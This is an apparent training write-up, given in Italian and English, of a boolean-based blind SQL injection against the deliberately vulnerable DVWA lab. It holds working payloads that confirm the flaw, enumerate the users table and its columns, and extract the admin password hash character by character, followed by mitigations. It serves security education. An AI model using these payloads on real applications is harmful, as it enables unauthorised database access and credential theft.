
## SQL Injection – Livello Low (Boolean-Based Blind)

## Descrizione

Nel livello "Low" di DVWA, il parametro `id` viene inserito direttamente nella query SQL senza alcuna validazione, rendendo possibile l'iniezione di codice arbitrario.  
In assenza di output diretto, l'applicazione restituisce messaggi distinti (“User ID exists” oppure “User ID is MISSING”), rendendo possibile un attacco di tipo **Blind SQL Injection basato su condizione booleana**.

## Obiettivo

- Verificare la presenza della tabella `users`
- Verificare l’esistenza delle colonne `user` e `password`
- Estrarre dati sensibili tramite condizioni logiche e controllo di lunghezza

## Ambiente di test

- DVWA livello: Low  
- VirtualBox  
- Browser: Firefox  
- Strumenti: Burp Suite, DevTools

---

## Fasi dell’attacco

### 1. Verifica della vulnerabilità

```sql
1' AND 1=1 #
```

→ **User ID exists** (condizione vera)

```sql
1' AND 1=2 #
```

→ **User ID is MISSING** (condizione falsa)

✅ Conferma che la risposta dell'applicazione dipende dall'esito della condizione logica → vulnerabilità presente.

---

### 2. Verifica dell’esistenza della tabella `users`

```sql
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name LIKE 'users%') > 0 -- -
```

→ **User ID exists**  
✔️ La tabella `users` esiste.

---

### 3. Verifica della colonna `user`

```sql
1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='user') > 0 -- -
```

→ **User ID exists**  
✔️ La colonna `user` è presente nella tabella `users`.

---

### 4. Verifica della colonna `password`

```sql
1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password') > 0 -- -
```

→ **User ID exists**  
✔️ La colonna `password` è presente nella tabella `users`.

---

### 5. Estrazione condizionale del primo carattere dell’username

```sql
1' AND SUBSTRING((SELECT user FROM users LIMIT 0,1),1,1)='a' -- -
```

→ La risposta varierà a seconda del carattere. Provando ogni lettera, si può ricostruire l’intero valore.


---

### 6. Estrazione condizionale della password dell’utente `admin`

```sql
1' AND SUBSTRING((SELECT password FROM users WHERE user='admin' LIMIT 0,1),1,1)='x' -- -
```

→ Anche qui si può iterare carattere per carattere per ricostruire l’intera password hashata.

> ⚠️ Per motivi etici, i valori ottenuti non vengono riportati.

---

## Considerazioni finali

La presenza di risposte diverse in base all'esito di una condizione logica rende questo scenario vulnerabile a Blind SQL Injection.  
Questo tipo di attacco permette, con pazienza, di ricostruire interi contenuti del database anche in assenza di output diretto.

---

## Mitigazioni consigliate

- Utilizzare **query parametrizzate** (prepared statements)
- Evitare di concatenare input dell’utente direttamente nelle query
- Validare e sanificare ogni dato in ingresso
- Ridurre i privilegi del database user utilizzato dall’applicazione
- Evitare messaggi distintivi (es. “exists” vs “missing”) per risposte condizionali
- Monitorare le richieste sospette nel traffico

---
> ⚠️ **Disclaimer Legale**
> 
> Tutte le attività documentate in questa repository sono state svolte esclusivamente in ambienti controllati, progettati per essere vulnerabili (es. DVWA, TryHackMe, laboratori locali).  
> Nessuna di queste tecniche è stata applicata contro sistemi reali, pubblici o privati, senza autorizzazione esplicita.
> 
> Questa repository ha finalità puramente didattiche ed educative.  
> L’autore **non si assume alcuna responsabilità** per l’uso improprio delle informazioni qui contenute.
---
---

## English Version – SQL Injection (Boolean-Based Blind)

## Description

In DVWA Low security level, the `id` parameter is directly inserted into an SQL query without any input validation.  
Even without direct output, the application replies with “User ID exists” or “User ID is MISSING” depending on the query result, allowing for **boolean-based blind SQL injection**.

## Objective

- Detect `users` table and its columns
- Extract sensitive data via logic-based inference
- Use length validation to avoid false positives

## Environment

- DVWA level: Low  
- VirtualBox  
- Firefox  
- Tools: Burp Suite, DevTools

---

## Attack steps

### 1. Vulnerability confirmation

```sql
1' AND 1=1 #
```

→ Valid: **User ID exists**

```sql
1' AND 1=2 #
```

→ Invalid: **User ID is MISSING**

✅ Application behavior confirms SQLi vulnerability.

---

### 2. Detecting the `users` table

```sql
1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name LIKE 'users%') > 0 -- -
```

→ Table exists.

---

### 3. Confirming column `user`

```sql
1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='user') > 0 -- -
```

✔️ Column `user` exists.

---

### 4. Confirming column `password`

```sql
1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password') > 0 -- -
```

✔️ Column `password` exists.

---

### 5. Extracting the first character of a username

```sql
1' AND SUBSTRING((SELECT user FROM users LIMIT 0,1),1,1)='a' -- -
```


---

### 6. Extracting the password of user `admin`

```sql
1' AND SUBSTRING((SELECT password FROM users WHERE user='admin' LIMIT 0,1),1,1)='x' -- -
```

→ Repeat character by character to extract the hash.

---

## Final notes

Even with no data printed on the page, conditional responses enable full database exfiltration through blind SQL injection.

---

## Recommended mitigation

- Use **prepared statements**
- Never concatenate user input in SQL queries
- Sanitize all input thoroughly
- Restrict database user privileges
- Avoid distinct messages that reveal internal logic
- Log and monitor suspicious request patterns
---
> ⚠️ **Legal Disclaimer**
> 
> All activities documented in this repository were performed **exclusively in controlled environments** specifically designed to be vulnerable (e.g., DVWA, TryHackMe, local labs).
> 
> None of the techniques shown here were executed against real, public, or private systems without explicit authorization.
> 
> This repository is intended **solely for educational and training purposes**.
> 
> The author **assumes no responsibility** for any misuse of the information provided herein.
---
---
---

